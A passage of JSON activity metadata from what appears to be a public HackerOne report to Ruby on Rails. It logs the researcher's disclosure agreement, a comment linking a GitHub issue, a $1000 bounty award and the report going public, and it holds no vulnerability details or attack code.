6.0.3.1)","automated_response":false,"created_at":"2020-10-24T22:47:41.640Z","updated_at":"2020-10-24T22:47:41.640Z","actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9892233,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-11-22T16:46:58.167Z","updated_at":"2020-11-22T16:46:58.167Z","first_to_agree":true,"actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10155165,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I added the rest to the issue on github.\nhttps://github.com/rails/rails/issues/40892","automated_response":false,"created_at":"2020-12-20T05:31:10.198Z","updated_at":"2020-12-20T05:31:10.198Z","actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10159660,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2020-12-20T23:58:27.604Z","updated_at":"2020-12-20T23:58:27.604Z","actor":{"url":"/rails","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Ruby on Rails"}},"bounty_amount":"1000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"rails","collaborator":{"username":"ooooooo_q","url":"/ooooooo_q"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10178494,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-12-22T16:47:02.528Z","updated_at":"2020-12-22T16:47:02.528Z","actor":{"url":"/rails","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Ruby on Rails"}},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}